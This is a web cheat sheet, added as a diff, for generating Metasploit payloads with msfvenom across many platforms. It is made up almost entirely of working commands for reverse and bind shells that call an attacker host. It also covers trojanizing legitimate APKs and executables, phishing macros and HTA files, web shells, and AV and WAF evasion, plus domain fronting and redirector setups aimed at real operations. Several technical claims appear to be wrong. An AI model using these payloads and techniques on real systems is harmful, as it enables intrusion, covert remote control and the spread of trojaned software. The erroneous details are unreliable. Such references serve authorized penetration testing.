@@ -1,0 +1,1113 @@
+---
+title: "MSFvenom Cheat Sheet"
+excerpt: "Enhanced, practical msfvenom reference covering payload generation across all platforms, staged vs stageless selection, encoding, encryption, bad-character handling, template injection, advanced handlers, and real-world delivery techniques."
+url: "https://asbawy.github.io/cheatsheet/Tools/MSFvenom"
+date: "2026-06-10"
+updated: "2026-07-01"
+category: "Tools"
+tags: ["msfvenom", "metasploit", "payload", "shellcode", "evasion", "tools"]
+difficulty: "Intermediate"
+readTime: "18 mins"
+---
+
+## Understanding Payload Types
+
+MSFvenom produces two fundamental payload categories. Choosing correctly impacts detection, reliability, and network behavior.
+
+| Type          | Naming Pattern                           | Size  | Behavior                                                                           | Best For                                                       |
+| ------------- | ---------------------------------------- | ----- | ---------------------------------------------------------------------------------- | -------------------------------------------------------------- |
+| **Staged**    | `.../reverse_tcp` (no `_reverse` prefix) | Small | Delivers a tiny stager; Metasploit uploads the full stage after initial connection | Size-constrained exploits, buffer overflows, limited bandwidth |
+| **Stageless** | `..._reverse_tcp` (underscore prefix)    | Large | Complete payload in one shot; no second-stage download                             | Production ops, stable C2, evading network inspection          |
+
+**Key rule**: Prefer **stageless** unless you have a specific reason (exploit size limits, known firewall constraints). Stageless eliminates the stager→stage roundtrip, reducing network artifacts and failure points.
+
+---
+
+## Discovery & Reconnaissance Commands
+
+Before generating any payload, enumerate what's available. Metasploit updates frequently — always check your local installation.
+
+```bash
+# Payload enumeration
+msfvenom -l payloads                               # All payloads
+msfvenom -l payloads | grep -i windows             # Windows only
+msfvenom -l payloads | grep -i linux               # Linux only
+msfvenom -l payloads | grep -i meterpreter         # Meterpreter variants
+msfvenom -l payloads | grep -i reverse             # Reverse shells only
+msfvenom -l payloads | grep -i stageless           # Stageless variants (underscore pattern)
+
+# Other modules
+msfvenom -l encoders                               # Available encoders
+msfvenom -l nops                                   # NOP sled generators
+msfvenom -l formats                                # Output formats
+msfvenom -l archs                                  # Supported architectures
+msfvenom -l encrypt                                # Encryption methods
+msfvenom -l platforms                              # Target platforms
+
+# Inspect a specific payload
+msfvenom -p windows/x64/meterpreter_reverse_https --list-options
+msfvenom -p linux/x64/meterpreter_reverse_tcp --list-options
+
+# Filtered discovery examples
+msfvenom -l payloads | grep "cmd/windows"          # Windows command payloads
+msfvenom -l payloads | grep "cmd/unix"             # Unix command payloads
+```
+
+> **Tip**: `--list-options` reveals hidden configurable variables (exit functions, retry counters, custom headers for HTTP/S) that dramatically improve reliability.
+
+---
+
+## Payload Naming Quick Reference
+
+MSFvenom payload names follow a predictable structure. Understanding it helps you guess valid payloads before listing them.
+
+```
+<platform>/<arch>/<payload>/<transport>
+```
+
+| Component   | Examples                                                             |
+| ----------- | -------------------------------------------------------------------- |
+| `platform`  | `windows`, `linux`, `osx`, `android`, `java`, `php`, `python`, `cmd` |
+| `arch`      | `x86`, `x64`, `aarch64`, `armle`, `mipsbe`, `mipsle`                 |
+| `payload`   | `meterpreter`, `shell`, `meterpreter_reverse`                        |
+| `transport` | `tcp`, `http`, `https`, `tcp_dns`, `tcp_rc4`                         |
+
+**Naming Gotchas**:
+
+- Staged: `meterpreter/reverse_tcp` — note the **slash** between payload and transport
+- Stageless: `meterpreter_reverse_tcp` — note the **underscore** replacing the slash
+- `reverse` = callback to attacker; `bind` = listener opens on target
+
+---
+
+## Windows Payloads
+
+### Reverse TCP (Staged & Stageless)
+
+```bash
+# Staged (smaller initial size; pulls stage over socket) 
+# x86 staged reverse TCP
+msfvenom -p windows/x86/meterpreter/reverse_tcp \
+  LHOST=10.10.10.10 LPORT=4444 \
+  -f exe -o rev_x86_staged.exe
+
+# x64 staged reverse TCP
+msfvenom -p windows/x64/meterpreter/reverse_tcp \
+  LHOST=10.10.10.10 LPORT=4444 \
+  -f exe -o rev_x64_staged.exe
+
+# Stageless (full payload embedded; recommended)
+# x64 stageless reverse TCP
+msfvenom -p windows/x64/meterpreter_reverse_tcp \
+  LHOST=10.10.10.10 LPORT=4444 \
+  -f exe -o rev_x64_stageless.exe
+
+# x86 stageless
+msfvenom -p windows/x86/meterpreter_reverse_tcp \
+  LHOST=10.10.10.10 LPORT=4444 \
+  -f exe -o rev_x86_stageless.exe
+```
+
+### Reverse HTTP/HTTPS (C2-Friendly, Firewall Evasive)
+
+```bash
+# HTTP transport (blends with web traffic; can use domain for LHOST)
+msfvenom -p windows/meterpreter/reverse_http \
+  LHOST=cdn.example.com LPORT=8080 \
+  HttpUserAgent="Mozilla/5.0 (Windows NT 10.0; Win64; x64)" \
+  -f exe -o rev_http.exe
+
+# HTTPS transport — strongly preferred for production
+msfvenom -p windows/x64/meterpreter_reverse_https \
+  LHOST=cdn.example.com LPORT=8443 \
+  HttpUserAgent="Mozilla/5.0 (Windows NT 10.0; Win64; x64)" \
+  -f exe -o rev_https.exe
+```
+
+> **Handler note for HTTPS**: Set `HandlerSSLCert /path/to/cert.pem` and `StagerVerifySSLCert false` (or provide the CA cert for true verification).
+
+### Named Pipe & Domain Fronting Transports
+
+```bash
+# Reverse TCP over SMB named pipe (useful for pivoting through internal networks)
+msfvenom -p windows/x64/meterpreter/reverse_named_pipe \
+  PipeName=meterpreter LHOST=10.10.10.10 \
+  -f exe -o rev_pipe.exe
+
+# Reverse HTTPS with custom URI (helps blend into legitimate URL patterns)
+msfvenom -p windows/x64/meterpreter_reverse_https \
+  LHOST=10.10.10.10 LPORT=443 \
+  LURI=/api/v3/update \
+  HttpUserAgent="Mozilla/5.0" \
+  -f exe -o rev_https_uri.exe
+```
+
+### PowerShell-Based Delivery
+
+```bash
+# Raw PowerShell script (pipe into IEX, -enc, or download cradle)
+msfvenom -p cmd/windows/reverse_powershell \
+  LHOST=10.10.10.10 LPORT=4444 \
+  -f ps1 -o rev.ps1
+
+# PowerShell with embedded Meterpreter (larger but feature-rich)
+msfvenom -p windows/x64/meterpreter/reverse_https \
+  LHOST=10.10.10.10 LPORT=8443 \
+  -f psh -o rev_met.ps1
+
+# PowerShell with reflection (no disk write of shellcode)
+msfvenom -p windows/x64/meterpreter/reverse_https \
+  LHOST=10.10.10.10 LPORT=8443 \
+  -f psh-reflection -o rev_ref.ps1
+```
+
+### Office Document & HTA Vectors
+
+```bash
+# VBA macro payload (embed into Word/Excel documents for phishing)
+msfvenom -p windows/x64/meterpreter_reverse_https \
+  LHOST=10.10.10.10 LPORT=8443 \
+  -f vba -o macro.vba
+
+# HTA (HTML Application) — double-click executes via update.exe
+msfvenom -p windows/x64/meterpreter_reverse_https \
+  LHOST=10.10.10.10 LPORT=8443 \
+  -f hta-psh -o drop.hta
+
+# VBS script payload
+msfvenom -p windows/x64/meterpreter_reverse_https \
+  LHOST=10.10.10.10 LPORT=8443 \
+  -f vbs -o rev.vbs
+```
+
+### DLL Outputs (for Sideloading / Hijacking)
+
+```bash
+# x86 DLL — inject with: rundll32.exe x86.dll,Control_RunDLL
+msfvenom -p windows/x86/meterpreter/reverse_tcp \
+  LHOST=10.10.10.10 LPORT=4444 \
+  -f dll -o payload_x86.dll
+
+# x64 DLL
+msfvenom -p windows/x64/meterpreter/reverse_tcp \
+  LHOST=10.10.10.10 LPORT=4444 \
+  -f dll -o payload_x64.dll
+
+# DLL with custom export name (for specific sideloading targets)
+msfvenom -p windows/x64/meterpreter_reverse_https \
+  LHOST=10.10.10.10 LPORT=8443 \
+  -f dll -o plugin.dll
+```
+
+### Bind Shells (Target Opens Listening Port)
+
+```bash
+# Standard Meterpreter bind (connect to target from attacker)
+msfvenom -p windows/x64/meterpreter/bind_tcp \
+  RHOST=0.0.0.0 LPORT=4444 \
+  -f exe -o bind_x64.exe
+
+# Hidden bind (appears to bind to port 0; stealthier)
+msfvenom -p windows/x64/meterpreter/bind_hidden_tcp \
+  RHOST=0.0.0.0 LPORT=4444 \
+  -f exe -o bind_hidden.exe
+```
+
+### Service & MSI Formats
+
+```bash
+# Windows Service executable (for service-based persistence)
+msfvenom -p windows/x64/meterpreter_reverse_https \
+  LHOST=10.10.10.10 LPORT=8443 \
+  -f exe-service -o rev_svc.exe
+
+# MSI installer package (runs via msiexec /quiet)
+msfvenom -p windows/x64/meterpreter_reverse_https \
+  LHOST=10.10.10.10 LPORT=8443 \
+  -f msi -o rev.msi
+
+# MSI with service (installs as Windows service)
+msfvenom -p windows/x64/meterpreter_reverse_https \
+  LHOST=10.10.10.10 LPORT=8443 \
+  -f msi-nouac -o rev_nouac.msi
+```
+
+---
+
+## Linux Payloads
+
+### Reverse TCP (Staged & Stageless)
+
+```bash
+# x86 staged ELF
+msfvenom -p linux/x86/meterpreter/reverse_tcp \
+  LHOST=10.10.10.10 LPORT=4444 \
+  -f elf -o lin_x86_staged.elf
+
+# x64 staged ELF
+msfvenom -p linux/x64/meterpreter/reverse_tcp \
+  LHOST=10.10.10.10 LPORT=4444 \
+  -f elf -o lin_x64_staged.elf
+
+# x64 stageless — preferred
+msfvenom -p linux/x64/meterpreter_reverse_tcp \
+  LHOST=10.10.10.10 LPORT=4444 \
+  -f elf -o lin_x64_stageless.elf
+
+# x64 stageless with HTTP transport (corporate egress)
+msfvenom -p linux/x64/meterpreter_reverse_http \
+  LHOST=10.10.10.10 LPORT=8080 \
+  -f elf -o lin_http.elf
+
+# x64 stageless with HTTPS transport
+msfvenom -p linux/x64/meterpreter_reverse_https \
+  LHOST=10.10.10.10 LPORT=8443 \
+  -f elf -o lin_https.elf
+```
+
+### Lightweight Shell Payloads (Non-Meterpreter)
+
+When size matters or Meterpreter isn't needed:
+
+```bash
+# Minimal x64 reverse shell (no Meterpreter overhead)
+msfvenom -p linux/x64/shell_reverse_tcp \
+  LHOST=10.10.10.10 LPORT=4444 \
+  -f elf -o shell_x64.elf
+
+# Minimal x86 reverse shell
+msfvenom -p linux/x86/shell_reverse_tcp \
+  LHOST=10.10.10.10 LPORT=4444 \
+  -f elf -o shell_x86.elf
+
+# Find-gadget reverse shell (uses /bin/sh — tiny)
+msfvenom -p linux/x86/shell/find_tag \
+  LHOST=10.10.10.10 LPORT=4444 \
+  -f elf -o shell_find.elf
+```
+
+### Bind Shells
+
+```bash
+# Meterpreter bind (staged)
+msfvenom -p linux/x64/meterpreter/bind_tcp \
+  RHOST=0.0.0.0 LPORT=4444 \
+  -f elf -o bind_x64.elf
+
+# Plain shell bind
+msfvenom -p linux/x64/shell_bind_tcp \
+  RHOST=0.0.0.0 LPORT=4444 \
+  -f elf -o bind_shell_x64.elf
+```
+
+### ARM & MIPS (Embedded/IoT)
+
+```bash
+# ARM little-endian reverse TCP (Raspberry Pi, embedded)
+msfvenom -p linux/armle/meterpreter/reverse_tcp \
+  LHOST=10.10.10.10 LPORT=4444 \
+  -f elf -o lin_arm.elf
+
+# MIPS big-endian reverse TCP (routers, IoT)
+msfvenom -p linux/mipsbe/meterpreter/reverse_tcp \
+  LHOST=10.10.10.10 LPORT=4444 \
+  -f elf -o lin_mips.elf
+
+# MIPS little-endian reverse TCP
+msfvenom -p linux/mipsle/meterpreter/reverse_tcp \
+  LHOST=10.10.10.10 LPORT=4444 \
+  -f elf -o lin_mipsle.elf
+```
+
+---
+
+## macOS Payloads
+
+```bash
+# x64 reverse TCP shell (staged)
+msfvenom -p osx/x64/shell/reverse_tcp \
+  LHOST=10.10.10.10 LPORT=4444 \
+  -f macho -o macos_shell.macho
+
+# x64 Meterpreter reverse TCP (stageless)
+msfvenom -p osx/x64/meterpreter_reverse_tcp \
+  LHOST=10.10.10.10 LPORT=4444 \
+  -f macho -o macos_met_tcp.macho
+
+# x64 Meterpreter reverse HTTPS — preferred for ops
+msfvenom -p osx/x64/meterpreter_reverse_https \
+  LHOST=10.10.10.10 LPORT=8443 \
+  -f macho -o macos_met_https.macho
+
+# Raw shellcode (inject into another process or binary)
+msfvenom -p osx/x64/shell_reverse_tcp \
+  LHOST=10.10.10.10 LPORT=4444 \
+  -f raw -o macos_sc.bin
+
+# Python payload (works across macOS versions)
+msfvenom -p python/meterpreter/reverse_tcp \
+  LHOST=10.10.10.10 LPORT=4444 \
+  -f raw -o macos.py
+```
+
+---
+
+## Android Payloads
+
+```bash
+# Standalone APK (stageless Meterpreter)
+msfvenom -p android/meterpreter/reverse_tcp \
+  LHOST=10.10.10.10 LPORT=4444 \
+  -f apk -o dropper.apk
+
+# Embed into existing APK (injects payload into legitimate app)
+msfvenom -x legitimate_app.apk -p android/meterpreter/reverse_tcp \
+  LHOST=10.10.10.10 LPORT=4444 \
+  -o trojaned_app.apk
+
+# HTTPS variants (more evasive)
+msfvenom -p android/meterpreter/reverse_https \
+  LHOST=10.10.10.10 LPORT=8443 \
+  -f apk -o and_https.apk
+
+# HTTP variant
+msfvenom -p android/meterpreter/reverse_http \
+  LHOST=10.10.10.10 LPORT=8080 \
+  -f apk -o and_http.apk
+
+# Android with hidden app icon
+msfvenom -p android/meterpreter/reverse_tcp \
+  LHOST=10.10.10.10 LPORT=4444 \
+  -f apk -o hidden.apk \
+  AndroidHideAppIcon=true
+```
+
+> **Embedding tip**: The `-x` template method requires the original APK to not have strong integrity checks. Some modern apps will crash if tampered with. Test thoroughly.
+
+---
+
+## Web Application Payloads
+
+### PHP
+
+```bash
+# Meterpreter reverse TCP (stageless; most compatible)
+msfvenom -p php/meterpreter_reverse_tcp \
+  LHOST=10.10.10.10 LPORT=4444 \
+  -f raw -o shell.php
+
+# Minimal PHP reverse shell (tiny; no Meterpreter)
+msfvenom -p php/reverse_php \
+  LHOST=10.10.10.10 LPORT=4444 \
+  -f raw -o tiny.php
+
+# Meterpreter over HTTPS (if target has OpenSSL)
+msfvenom -p php/meterpreter_reverse_https \
+  LHOST=10.10.10.10 LPORT=8443 \
+  -f raw -o shell_https.php
+
+# Download & execute style (prepend to any PHP file)
+msfvenom -p php/meterpreter_reverse_tcp \
+  LHOST=10.10.10.10 LPORT=4444 \
+  -f raw -o payload.php
+```
+
+> **WAF evasion**: Many WAFs flag Meterpreter magic bytes. Prepend benign PHP code: `echo '<?php // Copyright 2026' > shell.php && cat payload.php >> shell.php`
+
+### Java (JSP / WAR)
+
+```bash
+# JSP reverse shell (drop into webapps/ or upload via manager)
+msfvenom -p java/jsp_shell_reverse_tcp \
+  LHOST=10.10.10.10 LPORT=4444 \
+  -f raw -o shell.jsp
+
+# WAR package (deploy to Tomcat/JBoss/WildFly via manager interface)
+msfvenom -p java/jsp_shell_reverse_tcp \
+  LHOST=10.10.10.10 LPORT=4444 \
+  -f war -o app.war
+
+# Java Meterpreter (more features than plain shell)
+msfvenom -p java/meterpreter/reverse_tcp \
+  LHOST=10.10.10.10 LPORT=4444 \
+  -f jar -o met.jar
+
+# Java Meterpreter HTTPS
+msfvenom -p java/meterpreter/reverse_https \
+  LHOST=10.10.10.10 LPORT=8443 \
+  -f jar -o met_https.jar
+```
+
+> **WAR deployment**: Upload via `/manager/html` on Tomcat, then access `/app/` (WAR name becomes the path).
+
+### ASP / ASPX
+
+```bash
+# Classic ASP (older IIS)
+msfvenom -p windows/meterpreter/reverse_tcp \
+  LHOST=10.10.10.10 LPORT=4444 \
+  -f asp -o shell.asp
+
+# ASPX (modern IIS, .NET Framework)
+msfvenom -p windows/meterpreter/reverse_tcp \
+  LHOST=10.10.10.10 LPORT=4444 \
+  -f aspx -o shell.aspx
+
+# ASPX with HTTPS transport
+msfvenom -p windows/x64/meterpreter_reverse_https \
+  LHOST=10.10.10.10 LPORT=8443 \
+  -f aspx -o shell_https.aspx
+```
+
+### ColdFusion
+
+```bash
+# ColdFusion payload (Adobe CFML)
+msfvenom -p java/jsp_shell_reverse_tcp \
+  LHOST=10.10.10.10 LPORT=4444 \
+  -f cfm -o shell.cfm
+```
+
+---
+
+## Scripting & Interpreter Payloads
+
+These generate code for interpreted languages — useful when you have code execution but can't drop binaries.
+
+```bash
+# Shell & Command payloads
+# Bash reverse shell (piped to bash on target)
+msfvenom -p cmd/unix/reverse_bash \
+  LHOST=10.10.10.10 LPORT=4444 \
+  -f raw -o rev.sh
+
+# Netcat-style reverse shell (uses /bin/sh)
+msfvenom -p cmd/unix/reverse_netcat \
+  LHOST=10.10.10.10 LPORT=4444 \
+  -f raw -o rev_nc.sh
+
+# Python reverse shell (works on Python 2.7+ and 3.x)
+msfvenom -p cmd/unix/reverse_python \
+  LHOST=10.10.10.10 LPORT=4444 \
+  -f raw -o rev.py
+
+# Python Meterpreter (full Meterpreter feature set)
+msfvenom -p python/meterpreter/reverse_tcp \
+  LHOST=10.10.10.10 LPORT=4444 \
+  -f raw -o met.py
+
+# Python Meterpreter HTTPS
+msfvenom -p python/meterpreter/reverse_https \
+  LHOST=10.10.10.10 LPORT=8443 \
+  -f raw -o met_https.py
+
+# Perl reverse shell
+msfvenom -p cmd/unix/reverse_perl \
+  LHOST=10.10.10.10 LPORT=4444 \
+  -f raw -o rev.pl
+
+# Ruby reverse shell
+msfvenom -p cmd/unix/reverse_ruby \
+  LHOST=10.10.10.10 LPORT=4444 \
+  -f raw -o rev.rb
+
+# Node.js / JavaScript reverse shell
+msfvenom -p nodejs/shell_reverse_tcp \
+  LHOST=10.10.10.10 LPORT=4444 \
+  -f raw -o rev.js
+
+# Lua reverse shell (for Redis, Wireshark, etc.)
+msfvenom -p cmd/unix/reverse_lua \
+  LHOST=10.10.10.10 LPORT=4444 \
+  -f raw -o rev.lua
+```
+
+> **Execution oneliners**:
+>
+> - Python: `python3 -c "$(cat rev.py)"` or `python3 rev.py`
+> - Ruby: `ruby rev.rb`
+> - Node: `node rev.js`
+> - Perl: `perl rev.pl`
+> - Lua: `lua rev.lua`
+
+---
+
+## Encoders, Evasion & Anti-Virus
+
+### Important Reality Check
+
+Encoding helps with **bad-character avoidance** and **minor signature obfuscation**, but it is **not** a reliable AV/EDR evasion technique on modern endpoints. Combine encoding with other techniques for real operations.
+
+### Listing & Selecting Encoders
+
+```bash
+# List all encoders
+msfvenom -l encoders
+
+# Notable encoders by architecture:
+# x86: x86/shikata_ga_nai (polymorphic XOR) — changes signature each iteration
+# x86: x86/xor_dynamic, x86/context_stat, x86/call4_dword_xor
+# x64: x64/xor_dynamic, x64/xor
+# All: cmd/powershell_base64, cmd/echo, cmd/brace
+
+# Apply encoder with iterations (each iteration re-encodes output of previous)
+msfvenom -p windows/x64/meterpreter_reverse_https \
+  LHOST=10.10.10.10 LPORT=8443 \
+  -e x64/xor_dynamic -i 3 \
+  -f exe -o encoded.exe
+
+# Multiple encoders in chain (applied left to right)
+msfvenom -p windows/x86/meterpreter/reverse_tcp \
+  LHOST=10.10.10.10 LPORT=4444 \
+  -e x86/shikata_ga_nai -i 5 \
+  -f exe -o heavily_encoded.exe
+```
+
+### Encoder Selection by Goal
+
+| Goal                             | Encoder                 | Notes                                                         |
+| -------------------------------- | ----------------------- | ------------------------------------------------------------- |
+| Polymorphism (signature evasion) | `x86/shikata_ga_nai`    | Changes every generation; effective against static signatures |
+| Bad char: null bytes             | `x86/xor_dynamic`       | Produces null-free output                                     |
+| CMD/batch delivery               | `cmd/powershell_base64` | Base64 wraps for PowerShell cradles                           |
+| Size constraint                  | `x86/countdown`         | Very small decoder stub                                       |
+| Modern x64 binary                | `x64/xor_dynamic`       | Good balance of size and effectiveness                        |
+
+---
+
+## Encryption Options
+
+MSFvenom supports encrypting the payload body. The handler decrypts automatically. Useful when your dropper/loader expects encrypted input.
+
+```bash
+# List encryption algorithms
+msfvenom --list encrypt
+
+# AES-256 encrypted payload
+msfvenom -p windows/x64/meterpreter_reverse_https \
+  LHOST=10.10.10.10 LPORT=8443 \
+  --encrypt aes256 --encrypt-key MySecretPass123 \
+  -f exe -o aes_encrypted.exe
+
+# RC4 encrypted payload
+msfvenom -p windows/x64/meterpreter_reverse_https \
+  LHOST=10.10.10.10 LPORT=8443 \
+  --encrypt rc4 --encrypt-key MyKey \
+  -f exe -o rc4_encrypted.exe
+
+# XOR encrypted payload
+msfvenom -p windows/x64/meterpreter_reverse_https \
+  LHOST=10.10.10.10 LPORT=8443 \
+  --encrypt xor --encrypt-key secret \
+  -f exe -o xor_encrypted.exe
+
+# Base64 encoded (not encryption, but useful for transport)
+msfvenom -p windows/x64/meterpreter_reverse_https \
+  LHOST=10.10.10.10 LPORT=8443 \
+  --encrypt base64 \
+  -f exe -o b64_encoded.exe
+```
+
+> **Warning**: Encryption may behave differently with staged payloads. Always test the specific payload + format + handler combination before operational use.
+
+---
+
+## Bad Characters & Restrictions
+
+Bad characters are bytes that break your delivery vector (null terminators in string functions, newline in HTTP headers, etc.).
+
+### Specifying Bad Characters
+
+```bash
+# Null byte restriction (most common for string buffers)
+msfvenom -p windows/x86/meterpreter/reverse_tcp \
+  LHOST=10.10.10.10 LPORT=4444 \
+  -b '\x00' \
+  -f raw -o nullfree.bin
+
+# Multiple bad chars (null + newline + carriage return + space)
+msfvenom -p windows/x86/meterpreter/reverse_tcp \
+  LHOST=10.10.10.10 LPORT=4444 \
+  -b '\x00\x0a\x0d\x20' \
+  -f raw -o restricted.bin
+
+# Full printable-only (extreme restriction)
+msfvenom -p windows/x86/meterpreter/reverse_tcp \
+  LHOST=10.10.10.10 LPORT=4444 \
+  -b '\x00\x01\x02\x03\x04\x05...\xff' \
+  -f raw -o printable.bin
+```
+
+### Common Bad Character Sets
+
+| Scenario               | Bad Characters     | Why                                          |
+| ---------------------- | ------------------ | -------------------------------------------- |
+| String buffer overflow | `\x00`             | Null terminator ends string copy             |
+| HTTP header injection  | `\x00\x0a\x0d`     | Null, newline, carriage return break HTTP    |
+| Unicode buffer         | `\x00-\x2f`        | Many non-printable break wide-char functions |
+| URL parameter          | `\x00\x20\x26\x3d` | Null, space, &, = break URL parsing          |
+
+### NOP Sleds (Buffer Overflows)
+
+```bash
+# Generate NOP sled of specific length
+msfvenom -p x86/nop -n 100 -f raw > nopsled.bin
+
+# Append to payload for exploit development
+cat payload.bin nopsled.bin > exploit.bin
+```
+
+---
+
+## Template Injection & Trojanization
+
+Inject payload into a legitimate executable. The original program still runs (if `-k` is used), reducing suspicion.
+
+### Basic Template Injection
+
+```bash
+# Inject payload into legitimate executable; preserve original functionality (-k)
+msfvenom -p windows/x64/meterpreter_reverse_https \
+  LHOST=10.10.10.10 LPORT=8443 \
+  -x notepad.exe -k \
+  -f exe -o trojan_notepad.exe
+
+# Template with specific architecture
+msfvenom -p windows/x64/meterpreter_reverse_https \
+  LHOST=10.10.10.10 LPORT=8443 \
+  -a x64 --platform windows \
+  -x putty.exe -k \
+  -f exe -o trojan_putty.exe
+```
+
+### How Template Injection Works
+
+| Flag        | Behavior                                                                                       |
+| ----------- | ---------------------------------------------------------------------------------------------- |
+| `-x <file>` | Use `<file>` as the executable template                                                        |
+| `-k`        | **Keep template functionality** — payload runs in a new thread; original exe executes normally |
+| (no `-k`)   | Payload replaces the entry point; original program does **not** run                            |
+
+> **Operational note**: Signed binaries lose their signature after template injection. The file will show as unsigned, which can trigger SmartScreen/AppLocker.
+
+---
+
+## Shellcode Generation & Injection
+
+Generate raw shellcode for custom loaders, process injection, or exploit development.
+
+```bash
+# Raw shellcode (inject via your own loader)
+msfvenom -p windows/x64/meterpreter_reverse_https \
+  LHOST=10.10.10.10 LPORT=8443 \
+  -f raw -o sc.bin
+
+# C-formatted shellcode (paste into C/C++ source)
+msfvenom -p windows/x64/meterpreter_reverse_https \
+  LHOST=10.10.10.10 LPORT=8443 \
+  -f c -o sc.c
+
+# Python-formatted shellcode
+msfvenom -p windows/x64/meterpreter_reverse_https \
+  LHOST=10.10.10.10 LPORT=8443 \
+  -f python -o sc.py
+
+# C# formatted (for .NET injectors)
+msfvenom -p windows/x64/meterpreter_reverse_https \
+  LHOST=10.10.10.10 LPORT=8443 \
+  -f csharp -o sc.cs
+
+# PowerShell-formatted shellcode bytes
+msfvenom -p windows/x64/meterpreter_reverse_https \
+  LHOST=10.10.10.10 LPORT=8443 \
+  -f ps1 -o sc.ps1
+
+# JavaScript-formatted (for HTML/HTA delivery)
+msfvenom -p windows/x64/meterpreter_reverse_https \
+  LHOST=10.10.10.10 LPORT=8443 \
+  -f js_be -o sc.js
+
+# Hex string (for embedding in various contexts)
+msfvenom -p windows/x64/meterpreter_reverse_https \
+  LHOST=10.10.10.10 LPORT=8443 \
+  -f hex -o sc.hex
+```
+
+### Advanced Shellcode Options
+
+```bash
+# Prepend migration stub (attempts to migrate to another process immediately)
+msfvenom -p windows/x64/meterpreter_reverse_https \
+  LHOST=10.10.10.10 LPORT=8443 \
+  PrependMigrate=true PrependMigrateProc=explorer.exe \
+  -f raw -o sc_migrate.bin
+
+# Exit function: thread (cleaner exit, doesn't kill host process)
+msfvenom -p windows/x64/meterpreter_reverse_https \
+  LHOST=10.10.10.10 LPORT=8443 \
+  EXITFUNC=thread \
+  -f raw -o sc_thread.bin
+
+# Exit function: process (kills host process on session end)
+msfvenom -p windows/x64/meterpreter_reverse_https \
+  LHOST=10.10.10.10 LPORT=8443 \
+  EXITFUNC=process \
+  -f raw -o sc_process.bin
+
+# Exit function: seh (uses Structured Exception Handler — for exploits)
+msfvenom -p windows/x64/meterpreter_reverse_https \
+  LHOST=10.10.10.10 LPORT=8443 \
+  EXITFUNC=seh \
+  -f raw -o sc_seh.bin
+```
+
+### EXITFUNC Reference
+
+| Value     | Behavior                                                  | Use Case                                   |
+| --------- | --------------------------------------------------------- | ------------------------------------------ |
+| `process` | Terminate the entire process when payload exits           | Standalone executables                     |
+| `thread`  | Terminate only the payload thread; host process continues | DLL injection, thread-based injection      |
+| `seh`     | Uses Structured Exception Handler to return               | Exploit development (stack/heap overflows) |
+| `none`    | No explicit cleanup                                       | Specialized injection scenarios            |
+
+---
+
+## Advanced Handler Configuration
+
+The handler (`exploit/multi/handler`) must match your payload settings exactly.
+
+### Basic Handler Setup
+
+```bash
+msfconsole -x "
+use exploit/multi/handler
+set PAYLOAD windows/x64/meterpreter_reverse_https
+set LHOST 10.10.10.10
+set LPORT 8443
+set HandlerSSLCert /path/to/unified.pem
+set ExitOnSession false
+exploit -j
+"
+```
+
+### Critical Handler Options
+
+```bash
+# Inside msfconsole
+msf6 > use exploit/multi/handler
+msf6 exploit(multi/handler) > set PAYLOAD windows/x64/meterpreter_reverse_https
+msf6 exploit(multi/handler) > set LHOST 10.10.10.10
+msf6 exploit(multi/handler) > set LPORT 8443
+
+# Network tuning
+# Bind handler to specific interface (VPN tunnel, localhost forward)
+msf6 exploit(multi/handler) > set ReverseListenerBindAddress 127.0.0.1
+
+# Bind port (when behind NAT; LPORT is what payload calls, ReverseListenerBindPort is local)
+msf6 exploit(multi/handler) > set ReverseListenerBindPort 8443
+
+# HTTPS configuration
+# Provide PEM-format certificate (private key + cert concatenated)
+msf6 exploit(multi/handler) > set HandlerSSLCert /path/to/cert+key.pem
+
+# Require payload to verify cert (stronger, but cert must be trusted/provisioned)
+msf6 exploit(multi/handler) > set StagerVerifySSLCert true
+
+# Ignore cert verification errors (more compatible, less secure)
+msf6 exploit(multi/handler) > set StagerVerifySSLCert false
+
+# Session management
+# Keep handler running after session (mandatory for -j background mode)
+msf6 exploit(multi/handler) > set ExitOnSession false
+
+# Accept multiple sessions on same handler
+msf6 exploit(multi/handler) > set EXITFUNC thread
+
+# Run handler as background job
+msf6 exploit(multi/handler) > exploit -j
+
+# Show active sessions
+msf6 exploit(multi/handler) > sessions -l
+
+# Interact with session
+msf6 exploit(multi/handler) > sessions -i 1
+```
+
+### HTTP-Specific Handler Options
+
+```bash
+# For reverse_http / reverse_https payloads
+msf6 exploit(multi/handler) > set PAYLOAD windows/x64/meterpreter_reverse_https
+
+# Custom URI path (must match LURI in payload if set)
+msf6 exploit(multi/handler) > set LURI /api/v3/update
+
+# Custom User-Agent check (if payload has custom UA)
+msf6 exploit(multi/handler) > set HttpUnknownRequestResponse <html><body>404</body></html>
+
+# Server header masquerading
+msf6 exploit(multi/handler) > set HttpServerName nginx
+
+# Cookie name customization
+msf6 exploit(multi/handler) > set HttpCookie APISESSION
+```
+
+---
+
+## Multi/Redirect Handlers
+
+Route callbacks through redirectors to protect your team server IP.
+
+### DNS Redirector
+
+```bash
+# Payload points to redirector domain
+msfvenom -p windows/x64/meterpreter_reverse_https \
+  LHOST=redirector.example.com LPORT=443 \
+  -f exe -o rev_redirect.exe
+
+# Redirector (socat) forwards to teamserver
+socat TCP4-LISTEN:443,fork TCP4:teamserver.example.com:8443
+```
+
+### CDN / Domain Fronting
+
+```bash
+# Use a CDN domain that fronts to your origin
+msfvenom -p windows/x64/meterpreter_reverse_https \
+  LHOST=cdnfront.azureedge.net LPORT=443 \
+  HttpHostHeader=yourbackend.azurewebsites.net \
+  -f exe -o rev_front.exe
+
+# Handler must match the Host header
+msf6 exploit(multi/handler) > set HttpHostHeader yourbackend.azurewebsites.net
+```
+
+### SSH Tunnel Handler
+
+```bash
+# Forward local port through SSH tunnel to handler
+ssh -R 8443:localhost:8443 user@vps.example.com
+
+# Payload calls VPS IP; traffic tunnels to your local handler
+msfvenom -p windows/x64/meterpreter_reverse_https \
+  LHOST=vps.example.com LPORT=8443 \
+  -f exe -o rev_tunnel.exe
+```
+
+---
+
+## Staged vs Stageless — When to Use Which
+
+| Factor                   | Staged                                                         | Stageless                                       |
+| ------------------------ | -------------------------------------------------------------- | ----------------------------------------------- |
+| **Binary size**          | Smaller (1-5 KB typical)                                       | Larger (100-300 KB typical)                     |
+| **Network reliability**  | Requires 2 connections; fragile on unstable networks           | Single connection; more resilient               |
+| **Firewall/Proxy**       | Needs direct socket; may fail through strict HTTP-only proxies | HTTP/S variants traverse most corporate proxies |
+| **Detection**            | Stager signature in memory; 2-stage artifact                   | Full payload in initial binary; single artifact |
+| **Meterpreter features** | Full feature set (loaded on stage)                             | Full feature set (embedded)                     |
+| **Use case**             | Exploits with size limits (BOF, constrained RCE)               | Phishing, USB drops, scheduled tasks, services  |
